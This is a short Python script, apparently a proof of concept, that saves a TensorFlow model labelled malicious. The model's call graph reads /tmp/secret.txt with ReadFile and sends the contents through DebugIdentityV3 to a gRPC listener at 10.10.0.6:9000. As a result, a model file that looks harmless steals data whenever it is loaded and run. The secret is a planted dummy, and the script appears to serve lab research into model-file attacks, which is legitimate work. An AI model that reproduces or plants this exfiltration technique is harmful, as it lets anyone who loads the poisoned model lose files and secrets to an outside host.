import tensorflow as tf
import os

# Create secret file
os.system('echo "THIS_IS_A_SECRET_MESSAGE" > /tmp/secret.txt')

class MaliciousModel(tf.Module):
    def __init__(self):
        super().__init__()
        self.w = tf.Variable(2.0)

    @tf.function(input_signature=[tf.TensorSpec(shape=(), dtype=tf.float32)])
    def __call__(self, x):
        # Read secret file, assume we know where the file is located
        file_content = tf.raw_ops.ReadFile(
            filename = "/tmp/secret.txt"
        )

        # Send to listener container
        tf.raw_ops.DebugIdentityV3(
            input = file_content,
            tensor_name = "secret_exfil",
            debug_urls=["grpc://10.10.0.6:9000"]
        )

        return self.w * x
    
model = MaliciousModel()

tf.saved_model.save(
    model, 
    "malicious_saved_model",
    signatures=model.__call__.get_concrete_function(tf.TensorSpec(shape=(), dtype=tf.float32))
)

print("Malicious model saved")
